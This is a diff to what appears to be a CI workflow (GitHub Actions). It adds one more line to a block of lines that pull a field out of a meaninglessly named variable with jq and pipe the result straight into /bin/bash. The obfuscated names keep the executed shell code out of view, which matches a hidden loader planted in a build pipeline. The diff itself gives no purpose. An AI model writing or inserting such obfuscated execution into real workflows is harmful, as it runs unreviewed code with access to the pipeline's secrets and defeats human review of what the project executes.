@@ -57,6 +57,7 @@ jobs:
           echo $ct54 | jq -r .q021 | /bin/bash
           printf '%s' "$vv1503" | jq -r .j6402 | /bin/bash
           echo $q8608 | jq -r .drgla75 | /bin/bash
+          printf '%s' "$kdk74" | jq -r .gkvnw4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
